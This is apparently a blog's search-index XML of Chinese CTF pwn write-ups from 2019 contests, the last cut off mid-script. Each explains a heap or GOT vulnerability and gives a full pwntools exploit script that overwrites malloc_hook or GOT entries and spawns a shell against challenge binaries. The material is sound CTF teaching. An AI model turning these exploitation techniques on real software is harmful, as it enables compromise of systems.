<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2019上海市大学生网络安全大赛-线上赛-pwn-BoringHeap Writeup</title>
      <link href="/2019/11/16/sh2019boringheap/"/>
      <url>/2019/11/16/sh2019boringheap/</url>
      
        <content type="html"><![CDATA[<p>2019上海市大学生网络安全大赛 线上赛pwn题BoringHeap的解题过程</p><a id="more"></a><h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p><code>abs(0x80000000)</code>即int变量最小值 <code>-2147483648</code>时 因为返回值int范围无法表示<code>+2147483648</code>所以返回值还是<code>0x80000000</code>，在题目中表现为abs(0x80000000) % 0x30 = -32 因此可以在<code>edit()</code>函数中修改<code>chunk_size</code></p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>因为可以修改<code>chunk_size</code>,通过修改为<code>unsorted bin</code>再<code>free</code>获取libc基地址,之后通过堆重叠先将<code>fake_size</code>置入<code>main_arena</code>然后<code>malloc()</code>获取位于<code>main_arena</code>的chunk来修改<code>last_remainder</code>为<code>malloc_hook - 0x10</code>的地址，最后<code>malloc</code>修改其为<code>one_gadget</code>地址，获取shell</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">#encoding:utf-8from pwn import *context.log_level =&#39;DEBUG&#39;main_arena_88_offset = 0x3c4b78find_fake_fast_offset = 0x23malloc_hook_offset = 0x3c4b10 one_gadget_offset = 0xf1147# size : 1 0x20 2 0x30 3 0x40def add(size,content):     sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Large&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Input Content:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;5.Exit&#39;)#  abs(-0x80000000)%0x30 = -32 = -0x20def add_full_content(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Large&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Input Content:&#39;)    sh.send(content)    sh.recvuntil(&#39;5.Exit&#39;)def edit(index,offset,content):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;Which one do you want to update?&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Where you want to update?&#39;)    sh.sendline(str(offset))    sh.recvuntil(&#39;Input Content:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;5.Exit&#39;)</code></pre><pre><code class="python">def delete(index):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;Which one do you want to delete?&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;5.Exit&#39;)def show(index):    sh.sendline(&#39;4&#39;)    sh.recvuntil(&#39;Which one do you want to view?&#39;)    sh.sendline(str(index))    recv_content = sh.recvuntil(&#39;5.Exit&#39;)    return recv_contentsh = process(&#39;./boringheap&#39;)#gdb.attach(sh)add(1,&#39;aaa&#39;) #0 add(2,&#39;bbb&#39;) #1add(3,&#39;ccc&#39;) #2add(2,&#39;ddd&#39;) #3add(2,&#39;eee&#39;) #4edit(1,0x80000000,&#39;\x00&#39; * 0x18 + p64(0xD1) )# 0xD1 = 0x40 + 0x50 + 0x40 + 1 用于堆重叠 delete(1)add(2,&#39;f&#39;) #5 切割0x41的[1] content  = show(2)libc_base = u64(content[1:7].ljust(8,&#39;\x00&#39;)) - main_arena_88_offsetlog.info(&#39;libc_base = &#39; + hex(libc_base))add(3,&#39;aaa&#39;) #6 堆重叠 地址同 [2]add(2,&#39;bbb&#39;) #7 同[3]delete(3) edit(7,0,p64(0x51)) add(2,&#39;ccc&#39;) # 将fake_size = 0x51置入main_arena</code></pre><pre><code class="python">delete(2)edit(6,0,p64(libc_base + 0x3c4b20 + 0x10)) # main_arenaadd(3,&#39;aaa&#39;)add_full_content(3,p64(0) * 7 + p64(libc_base + 0x3c4b10 - 0x10)) #malloc_hookadd(3,p64(libc_base + one_gadget_offset))sh.sendline(&#39;1&#39;)sh.sendline(&#39;1&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>湖湘杯2019复赛 pwn Writeup</title>
      <link href="/2019/11/09/hxb2019pwn/"/>
      <url>/2019/11/09/hxb2019pwn/</url>
      
        <content type="html"><![CDATA[<p>湖湘杯2019复赛pwn题的解题过程</p><a id="more"></a><h1 id="HackNote"><a href="#HackNote" class="headerlink" title="HackNote"></a>HackNote</h1><p>IDA打开发现是静态编译的堆题,没开任何保护,基本操作便是add(),delete(),edit().<br>特点是将malloc得到的指针放在了栈上rsp + 0x20的位置,而size则放在了rsp + 0x20 + 16*8 = rsp + 0xa0的位置,且因为是静态编译,无法使用pwngdb中的heap/fastbins/unsorted等指令,相当于增加了调试难度.</p><h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off_by_one"></a>off_by_one</h3><p>题目中在edit时,修改新的size是用的strlen()函数,因此当我们将chunk中的内容与next_chunk的size连起来时,size就会被 + 2 因此就可以再次edit()来修改next_chunk的size</p><h3 id="堆重叠来获取main-arena-chunk"><a href="#堆重叠来获取main-arena-chunk" class="headerlink" title="堆重叠来获取main_arena_chunk"></a>堆重叠来获取main_arena_chunk</h3><p>具体过程见EXP</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8from pwn import *sh = process(&#39;./HackNotenew&#39;)#sh = remote(&#39;183.129.189.62&#39;,21004)main_arena_88 = 0x00000000006ca858main_arena_0x61 = 0x6ca828malloc_hook = 0x6CB788chunk_ptr = 0x6cbc40context.log_level = &#39;DEBUG&#39;context(os=&quot;linux&quot;, arch=&quot;amd64&quot;)def add(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Input the Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Input the Note:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;4. Exit&#39;)def add_full(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Input the Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Input the Note:&#39;)    sh.send(content)    sh.recvuntil(&#39;4. Exit&#39;)def delete(index):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;Input the Index of Note:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;4. Exit&#39;)</code></pre><pre><code class="python">def edit(index,content):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;Input the Index of Note:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Input the Note:&#39;)    sh.send(content)gdb.attach(sh)sh.recvuntil(&#39;4. Exit&#39;)add(0x108,&#39;aaaa&#39;) #0 暂时不能使用off_by_oneadd(0x200,&#39;b&#39; * 0x1f0 + p64(0x200) ) #1 0x200是fake_prev_size  add(0x100,&#39;cccc&#39;) #2 next_chunkadd(0x100,&#39;dddd&#39; ) #3edit(0,&#39;a&#39; * 0x108) # 这次修改将size改为了0x10a (本来的0x108 + next_chunk的size两字节)delete(1) # [2] prev_size = 0x210 size = 0x110edit(0,&#39;a&#39; * 0x108 + &#39;\n&#39;) # [1] size = 0x200 off_by_one修改add(0xa0,&#39;eeee&#39;) #1 切割原先free的 [1] 被修改的prev_size是一开始add()时写上去的0x200add(0x50,&#39;ffff&#39;) #4 add(0x40,&#39;gggg&#39;) #5# 堆重叠的两个fastbindelete(1)delete(2) #触发合并 size = 0x321 add(0x300,&#39;hhhh&#39;) #1 覆盖[4] [5] 两个fastbindelete(4) delete(5)edit(1,&#39;\x00&#39; * 0xa8 +  p64(0x60) + p64(0x51) + p64(0) *10 + p64(0x51) + p64(0x6cb820) + &#39;\n&#39;) # [4]-&gt;fd = 0x51 目的是修改main_arena 0x6ca828这个地址的值 [5] -&gt; fd = 0x6cb820 fake_chunk_in_main_arena 的地址add(0x50, &#39;aaa&#39;) #4 此时 *0x6ca828 = 0x51add(0x40, &#39;bbb&#39;) #5 此时 *0x6ca820 = 0x6ca820add(0x40, p64(0) * 5 + p64(malloc_hook - 0x10) ) #malloc()得到0x6ca830 修改 main_arena + 88 即 last_remainder 的值为 malloc_hook -0x10 的地址add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) ) add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) )add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) ) #malloc()三次是因为之前的unsorted bin 还没切割完,优先级比last_remainder高sh.sendline(&#39;1&#39;)sh.sendlineafter(&quot;Input the Size:&quot;, &#39;64&#39;)sh.interactive()</code></pre><h1 id="NameSystem"><a href="#NameSystem" class="headerlink" title="NameSystem"></a>NameSystem</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>利用doublefree获取 got表 0x60200a 这一地址的fake_chunk,然后修改free()的got表低四位为system()的0x5390 ,然后free()之前申请的内容为<code>/bin/sh</code>的chunk,若地址正确是就相当于<code>system(&#39;/bin/sh&#39;)</code>然后爆破三位获取shell</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *#context.log_level =&#39;DEBUG&#39;def add(size, content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Name Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Name:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;Your choice :&#39;)def delete(index):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;The id you want to delete:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Your choice :&#39;)x = 1while (1):    log.info(&#39;time =&#39; + str(x))    x+=1    sh = process(&#39;./NameSystem&#39;)    #sh = remote(&#39;183.129.189.62&#39;,15905)    sh.recvuntil(&#39;Your choice :&#39;)    for i in range(18):        add(0x40,&#39;aaa&#39;)    #gdb.attach(sh)    add(0x50,&#39;bbb&#39;)    add(0x50,&#39;ccc&#39;)</code></pre><pre><code class="python">    delete(0)    delete(18)    delete(17)    delete(19)    delete(0)    delete(0)    delete(0)    delete(0)    add(0x50,p64(0x601ffa))    add(0x50,&#39;\x00&#39;)    add(0x50,&#39;/bin/sh\x00&#39;)    add(0x50,&#39;\x00&#39; * 14 + &#39;\x90\x53&#39;) #最后三位0x390确定 爆破0x005这三位 &#39;\x00&#39;来自于readin()函数的实现会将&#39;\n&#39;替换成&#39;\x00&#39;     try:        sh.sendline(&#39;3&#39;)        sh.recvuntil(&#39;The id you want to delete:&#39;)        sh.sendline(str(15))        sleep(0.2)        sh.sendline(&#39;ls&#39;)        sh.recv()        sh.sendline(&#39;ls&#39;)    except EOFError:        sh.close()        continue    else:        sh.interactive()</code></pre><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>先将<code>ptr[0]</code>修改为got表地址用于泄露libc地址，然后修改<code>free_got</code>为<code>puts_plt</code>，这样在<code>delete(0)</code>时就能得到libc地址,同时需要在got表段留下<code>size = 0x41</code>的fake_size用于再次修改<code>free_got</code>为<code>system</code>,此时delete()内容为<code>/bin/sh</code>的chunk就能getshell</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">#encoding:utf-8from pwn import *from LibcSearcher import LibcSearchercontext.log_level =&#39;DEBUG&#39;def add(size, content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Name Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Name:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;Your choice :&#39;)def delete(index):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;The id you want to delete:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Your choice :&#39;)sh = process(&#39;./NameSystem&#39;)sh.recvuntil(&#39;Your choice :&#39;)for i in range(18):    add(0x40,&#39;aaa&#39;)</code></pre><pre><code class="python">#gdb.attach(sh)#三次double freeadd(0x50,&#39;bbb&#39;)add(0x50,&#39;ccc&#39;)delete(0)delete(18)delete(17)delete(19)delete(0)add(0x60,&#39;ddd&#39;)add(0x60,&#39;eee&#39;)delete(0)delete(18)delete(17)delete(19)delete(0)add(0x30,&#39;fff&#39;)add(0x30,&#39;ggg&#39;)delete(0)    delete(18)delete(17)delete(19)delete(0)for i in range(12):    delete(0)#令ptr[0] = 0x602060 即atoi_got 用于待会的puts libc地址add(0x60,p64(0x60208d))add(0x60,p64(0))add(0x60,&#39;/bin/sh\x00&#39;) # 此处/bin/sh没有特别意义add(0x60,&#39;\x00&#39;*3 + p64(0x602060)) </code></pre><pre><code class="python">#修改free_got 为 puts_plt add(0x50,p64(0x601ffa))add(0x50,p64(0))add(0x50,&#39;/bin/sh\x00&#39;)add(0x50,&#39;\x00&#39; * 0x6 + p64(0x41) + p32(0x4006a0) + &#39;\x00&#39; *3 ) # &#39;\x00&#39; * 0x6 + p64(0x41) 是加起来长度0xe的 padding 0x41 是为了等会再次修改free_got时malloc(0x30)留下的fake_chunk_size # p32(0x4006a0) + &#39;\x00&#39; *3 再加上会被readin()修改为&#39;\x00&#39;的&#39;\n&#39; 一共8字节 如果用p64(0x4006a0) 会越界一字节导致报错sh.sendline(&#39;3&#39;)sh.recvuntil(&#39;The id you want to delete:&#39;)sh.sendline(&#39;0&#39;)atoi_addr = u64(sh.recvuntil(&#39;\n&#39;)[:-1].ljust(8,&#39;\x00&#39;))libc = LibcSearcher(&#39;atoi&#39;,atoi_addr)libc_base = atoi_addr - libc.dump(&#39;atoi&#39;)log.info(&#39;libc_base = &#39; + hex(libc_base))system_addr = libc_base + libc.dump(&#39;system&#39;)#泄露libc地址add(0x30, p64(0x602008))add(0x30,p64(0))add(0x30,&#39;/bin/sh\x00&#39;)add(0x30,p64(system_addr)[:7] )#再次修改free_got为system_addr [:7] 也是防止越界sh.sendline(&#39;3&#39;)sh.recvuntil(&#39;The id you want to delete:&#39;)sh.sendline(&#39;15&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackergame2019 没有bug的教务系统 Writeup</title>
      <link href="/2019/11/02/hackergame2019-easyCPP-wp/"/>
      <url>/2019/11/02/hackergame2019-easyCPP-wp/</url>
      
        <content type="html"><![CDATA[<p>中科大hackergame2019里 没有bug的教务系统 的writeup</p><a id="more"></a><p>先引用一下官方的wp</p><blockquote><p><a href="https://github.com/ustclug/hackergame2019-writeups/tree/master/official/%E6%B2%A1%E6%9C%89_BUG_%E7%9A%84%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">官方writeup</a></p></blockquote><h1 id="核心思路"><a href="#核心思路" class="headerlink" title="核心思路"></a>核心思路</h1><p>即利用edit info中 v5的任意地址free</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>核心就在于editInfo()以及setPassword()<br><img src="https://i.loli.net/2019/11/02/UYhXblJrTtVEcjP.png" alt="setPassword"><br><img src="https://i.loli.net/2019/11/02/BXERUAtxlVcLGH7.png" alt="editInfo"><br>setPassword()中的s[]距editInfo()中v5的偏移为0x80<br><img src="https://i.loli.net/2019/11/02/2pTde9CLxwOEmAy.jpg" alt="setPassword"></p><p><img src="https://i.loli.net/2019/11/02/3REaMuLSAfpOz57.jpg" alt="editInfo"></p><blockquote><p>偏移量 = 0x7ffd3a074ba0 - 0xB0 - 0x7ffd3a074ba0 + 0x30  = - 0x80</p></blockquote><p>具体过程见EXP的注释 </p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre><code class="python">#encoding:utf-8from pwn import *password = &#39;\x44\x00\x02\x41\x43\x47\x10\x63\x00&#39;one_gadget_offset = 0xf02a4pswd_addr = 0x6032E0context.log_level = &#39;DEBUG&#39;elf =ELF(&#39;./EasyCPP&#39;)pswd = map(lambda x:ord(x) , list(password))ans = &#39;&#39;#sh = process(&#39;./EasyCPP&#39;)for i in reversed(range(8)):    for x in range(256):        if(pswd[i] == (((x | pswd[i + 1]) &amp; ~(x &amp; pswd[i + 1]) | i) &amp; ~((x | pswd[i + 1]) &amp; ~(x &amp; pswd[i + 1]) &amp; i))):            pswd[i] = x            breakans = &#39;&#39;.join(map(lambda x : chr(x) , pswd) )def edit(ps , stu):    sh.sendlineafter(&#39;Please tell me your choice:&#39;,&#39;1&#39;)    sh.sendafter(&#39;Your new password:&#39;,ps)    sh.sendafter(&#39;please:&#39;,stu)    sh.sendlineafter(&#39;grade(0~100):&#39;,&#39;0&#39;)    sh.sendlineafter(&#39;grade:&#39;,&#39;0&#39;)    sh.sendlineafter(&#39;grade:&#39;,&#39;0&#39;)    sh.sendlineafter(&#39;grade:&#39;,&#39;0&#39;)sh = process(&#39;./EasyCPP&#39;)#gdb.attach(sh)sh.recvuntil(&#39;Username:&#39;)sh.sendline(&#39;admin&#39;)sh.recvuntil(&#39;Password:&#39;)sh.send(ans)</code></pre><pre><code class="python">payload = (p64(0) + p64(0x21) + p64(0)*2 +p64(0) + p64(0x21) + p64(0) *2 + p64(0) + p64(0x21) + p64(0) *2).ljust(0x80,&#39;\x00&#39;)payload += p64(0)edit(payload,&#39;a&#39; * 0x20)# 第一次循环是为了将v4 free 置入fastbin中,因此fake chunk其实不必构造# v4是malloc(0x0B) 即 len(&#39;PB19000001&#39;) + 1 实际size = 0x21payload = (p64(0) + p64(0x21) + p64(0)*2 +p64(0) + p64(0x21) + p64(0) *2 + p64(0) + p64(0x21) + p64(0) *2).ljust(0x80,&#39;\x00&#39;)payload += p64(pswd_addr + 0x10)edit(payload,&#39;a&#39;)# 第二次循环 构造size = 0x21的fake_chunk 使得在T-&gt;edit中malloc(1) 得到最小chunk# free(fake_chunk) 再在 T-&gt;edit 中将其malloc出来，且仅修改最低一字节为0x61sh.recvuntil(&#39;STUDENT: &#39;)heap_addr = u64(sh.recvuntil(&#39;GPA:&#39;)[:-4].ljust(8,&#39;\x00&#39;))log.info(&#39;heap_addr = &#39; + hex(heap_addr))# 泄露heap地址 偏移固定payload = (p64(0) + p64(0x21) + p64(0)*2 +p64(0) + p64(0x21) + p64(0) *2 + p64(0) + p64(0x21) + p64(0) *2).ljust(0x80,&#39;\x00&#39;)payload += p64(heap_addr - 0x41)edit(payload ,p64(elf.got[&#39;setvbuf&#39;]))sh.recvuntil(&#39;STUDENT: &#39;)# 第三次循环 heap_addr - 0x41 = 程序开始时malloc(0x18)的T所在chunk ,fd 即为studentNum# 先将其free再在T-&gt;edit 中将其malloc出来 修改studentNum为got表地址 即可获得libc地址 libc题目已给出 偏移量已知libc_setvbuf_addr = u64(sh.recvuntil(&#39;GPA:&#39;)[:-4].ljust(8,&#39;\x00&#39;))libc_base = libc_setvbuf_addr - 0x6fe70log.info(&#39;libc_base_addr =&#39; + hex(libc_base))one_gadget = libc_base + one_gadget_offsetfind_fake_fast_offset = 0x23malloc_hook_offset = 0x3C4B10payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(pswd_addr + 0x10) + p64(0)*2 #+ &#39;\x21&#39;edit(payload,&#39;a&#39; * 0x30)# 第四次循环, 构造fake_chunk size = 0x71 用于寻找find_fake_fast# 这次循环 仅为了将bss段上的pswd地址free进fastbin链中 fd会被置0</code></pre><pre><code class="python">payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(0) + p64(0)*2 #+ &#39;\x21&#39;edit(payload,&#39;\x00&#39; * 0x60)# 第五次循环 UAF 修改刚刚被free的fake chunk 的fd = fake_fast 然后将其malloc 此时已不必利用free(v5) 因此是p64(0)payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(0) + p64(0)*2 #+ &#39;\x21&#39;edit(payload,&#39;a&#39; * 0x13 + p64(one_gadget) + &#39;\x00&#39; * 69)# 最后一次循环 malloc fake_fast a*0x13 是算上了 find_fake_fast的chunk头0x10 修改malloc_hook 为one_gadgetsh.sendlineafter(&#39;Please tell me your choice:&#39;,&#39;1&#39;)sh.sendline(&#39;1234&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iChunQiu 巅峰极客2019 pwn snote Writeup</title>
      <link href="/2019/10/19/iChunQiu-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22019-pwn-snote-Writeup/"/>
      <url>/2019/10/19/iChunQiu-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22019-pwn-snote-Writeup/</url>
      
        <content type="html"><![CDATA[<p>今天打了i春秋巅峰极客2019初赛，记录一下pwn题snote的解题过程</p><a id="more"></a><h1 id="题目限制"><a href="#题目限制" class="headerlink" title="题目限制"></a>题目限制</h1><p>这道题的show和delete都只能使用一次，且edit最多修改size + 8的内容，malloc max size =0x1000，这些限制相当大。</p><h2 id="解题思路-amp-运用到的方法"><a href="#解题思路-amp-运用到的方法" class="headerlink" title="解题思路 &amp; 运用到的方法"></a>解题思路 &amp; 运用到的方法</h2><ol><li>House of Orange</li><li>UAF</li><li>Unsorted Bin Attack</li><li>Fast Bin Attack<br>主要步骤就是</li></ol><ul><li>先申请一个chunk且size为0x08结尾，这样修改size + 8时就可以修改next chunk的size</li><li>因此可以修改top chunk的size为一个小于0x1000的值(注意要对齐内存)<h3 id="对齐内存"><a href="#对齐内存" class="headerlink" title="对齐内存"></a>对齐内存</h3><blockquote><p>什么是对齐到内存页呢？我们知道现代操作系统都是以内存页为单位进行内存管理的，一般内存页的大小是 4kb。那么我们伪造的 size 就必须要对齐到这个尺寸。在覆盖之前 top chunk 的 size 大小是 20fe1，通过计算得知 0x602020+0x20fe0=0x623000 是对于 0x1000（4kb）对齐的。</p></blockquote></li></ul><blockquote><pre><code>0x602000:   0x0000000000000000  0x00000000000000210x602010:   0x0000000000000000  0x00000000000000000x602020:   0x0000000000000000  0x0000000000020fe1 &lt;== top chunk0x602030:   0x0000000000000000  0x0000000000000000</code></pre><p>因此我们伪造的 fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size。而 0x40 不满足对齐，因此不能实现利用。(引用自CTF-WIKI)</p><ul><li>在修改之后，当我们申请一个size = 4096(题目限制) 的chunk时，就会触发下列机制</li></ul></blockquote><blockquote><p>当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins</p></blockquote><blockquote><p>在 glibc/malloc/malloc.c 中的 _int_malloc 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 bck-&gt;fd 的位置写入本 Unsorted Bin 的位置(就是main_arena + 某一固定offset)的地址</p><ul><li>在这道题中，就是当我们在修改top chunk size后申请size = 4096的chunk时，原top chunk就变成了unsorted bin，效果如下<br><img src="https://i.loli.net/2019/10/19/a82GTlwIosVdNPg.png" alt="markdown"></li><li>但是此时我们的ptr指向的是0x1000的chunk而非那个被放入unsorted bin的原top chunk，因此下一步便是再申请一个chunk 这样就会从那个unsorted bin 中切割出来chunk 依旧可以获得一个偏移固定的main_arena地址，效果如下，bk指针偏移量固定，main_arena + 1640<br><img src="https://i.loli.net/2019/10/19/dwbAm9cphxYESUK.png" alt="markdown"></li><li>在这之后，我们可以使用show()来获取main_arena的地址，进而获取libc的基址</li></ul></blockquote><h4 id="获取libc基地址"><a href="#获取libc基地址" class="headerlink" title="获取libc基地址"></a>获取libc基地址</h4><ul><li>就是bk中地址 - 1640 - libc基地址 = 固定偏移量</li><li>即0x7f554a5a7188 - 1640 - 0x7f554a1e2000 = 0x3C4B20<br><img src="https://i.loli.net/2019/10/19/JqeTnbKR1fSLBHi.png" alt="markdown"></li><li>综上，show()函数接受到的地址，再-1640 -0x3C4B20 就是基地址了<h4 id="获取malloc-hook"><a href="#获取malloc-hook" class="headerlink" title="获取malloc_hook"></a>获取malloc_hook</h4></li><li>malloc_hook的位置就在main_arena地址上方0x10，即偏移量0x3C4B10<h4 id="获得libc基址之后"><a href="#获得libc基址之后" class="headerlink" title="获得libc基址之后"></a>获得libc基址之后</h4></li><li>因为在delete()之后指针并未置0，因此可以通过UAF + fast_bin_attack来修改malloc_hook为one_gadget的地址</li><li>具体操作是先delete()，然后UAF,修改fd为fake_chunk_addr,再连续malloc两次，获得的就是那个fd的指针<h4 id="fake-chunk获取"><a href="#fake-chunk获取" class="headerlink" title="fake_chunk获取"></a>fake_chunk获取</h4><blockquote><p>find_fake_fast (malloc_hook_addr) (size)<br><img src="https://i.loli.net/2019/10/19/werltWpHa2zKud9.png" alt="markdown"></p></blockquote></li></ul><p>即偏移为离malloc_hook为0x23<br>要修改的fd就是fake_chunk的地址</p><h5 id="注"><a href="#注" class="headerlink" title="注"></a>注</h5><p>当后面两次malloc()获得fake_chunk后，edit的时候偏移是<em>0x23 - 0x10 = 0x13</em> (因为malloc时给的还要加上0x10的prev_size和size)</p><p>最后修改成功后再次malloc即可获得shell</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8from pwn import *from LibcSearcher import LibcSearchersh = process(&#39;./snote&#39;)#sh = remote(&#39;55fca716.gamectf.com&#39;,37009)main_arena_offset = 1640offset_base = 0x3c4b20malloc_hook_offset = 0x3C4B10context.log_level = &#39;DEBUG&#39;def add(size,content):    sh.sendline(&#39;1&#39;)    sleep(0.5)    sh.sendlineafter(&#39;Size &gt; &#39;,str(size))    sh.sendlineafter(&#39;Content &gt; &#39;,content)    sh.recvuntil(&#39;Your choice &gt; &#39;)def delete():    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;Your choice &gt;&#39;)def show():    sh.sendline(&#39;2&#39;)    ans = u64(sh.recvuntil(&#39;Done!&#39;)[8:16])    print(&#39;addr =&#39;,ans)    sh.recvuntil(&#39;Your choice &gt;&#39;)    return ansdef edit(size,content):    sh.sendline(&#39;4&#39;)    sleep(0.5)    sh.sendlineafter(&#39;Size &gt;&#39;,str(size))    sh.sendafter(&#39;Content &gt;&#39;,content)    sh.recvuntil(&#39;Your choice &gt;&#39;)sh.sendline(&#39;aaa&#39;)</code></pre><pre><code class="python">sh.recvuntil(&#39;Your choice &gt; &#39;)add(0x58,&#39;111&#39;) #0gdb.attach(sh)payload = &#39;\x00&#39; * 0x58  +p64(0xfa1)#0xfa1 内存页对齐edit(0x60,payload)add(4096,&#39;&#39;)add(0x60,&#39;&#39;)addr = show()main_arena_addr = addr - main_arena_offsetlibc_base = main_arena_addr - offset_baseone_gedget = libc_base + 0xf02a4malloc_hook = libc_base + malloc_hook_offsetfake_chunk_addr = malloc_hook - 0x23#find_fake_fast 时注意size是0x70 因为chunk头占0x10print(&#39;libc_base = &#39; ,hex(libc_base))print(&#39;main_arena =&#39; ,hex(main_arena_addr))print(&#39;malloc_hook=&#39;, hex(malloc_hook))print(&#39;one_gadget =&#39;,hex(one_gedget))print(&#39;fakechunk = &#39;,hex(fake_chunk_addr))delete()edit(8,p64(fake_chunk_addr))add(0x60,&#39;&#39;)add(0x60,&#39;&#39;)edit(27,&#39;\x00&#39; * 0x13 + p64(one_gedget))sh.sendline(&#39;1&#39;)sleep(0.2)sh.send(&#39;24&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz two targets WriteUp</title>
      <link href="/2019/09/12/twotargets/"/>
      <url>/2019/09/12/twotargets/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的two targets的WriteUp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/yN2GnJkgAhOiSVU.png" alt="MarkDown"></p><p>顾名思义，two targets，本题有两种做法。</p><h2 id="方法一-GOT覆写"><a href="#方法一-GOT覆写" class="headerlink" title="方法一 : GOT覆写"></a>方法一 : GOT覆写</h2><p><img src="https://i.loli.net/2019/09/12/3oWZYFRrVfyHunv.png" alt="MarkDown"></p><p><img src="https://i.loli.net/2019/09/12/MAsQIB13NypSlze.png" alt="MarkDown"></p><p>由于v7 v8之间距离为0x10 = 16 ，而scanf往<code>&amp;v7</code>中读入的有24字节，因此可以先选择输入2，覆写</p><p><code>v8</code>中存储的地址，然后输入3，达到任意写的目的。又因为并没有开启FULL RELRO保护，所以可以GOT覆写。</p><p><img src="https://i.loli.net/2019/09/12/Dqhrd3jSLR4lgvb.png" alt="MarkDown"></p><p><em>注意</em> </p><p>因为往v8中读入的scanf()是%d 因此win()函数的地址需要转化成10进制输入0x40099c = 4196764</p><h3 id="方法一-EXP"><a href="#方法一-EXP" class="headerlink" title="方法一 EXP"></a>方法一 EXP</h3><pre><code class="python">#coding:utf-8from pwn import *context.log_level = &#39;DEBUG&#39;#sh = process(&#39;./challenge&#39;)sh = remote(&#39;svc.pwnable.xyz&#39;,30031)elf = ELF(&#39;./challenge&#39;)#puts_got = elf.got[&#39;puts&#39;]#got覆写，如果选择覆写puts()则会报错，原因不明strcmp_got = elf.got[&#39;strncmp&#39;]#print(puts_got)flag =     0x40099Cpayload = &#39;A&#39; * 16 + p64(strcmp_got)#sh.recvuntil(&#39;&gt; &#39;)sh.sendlineafter(&#39;&gt; 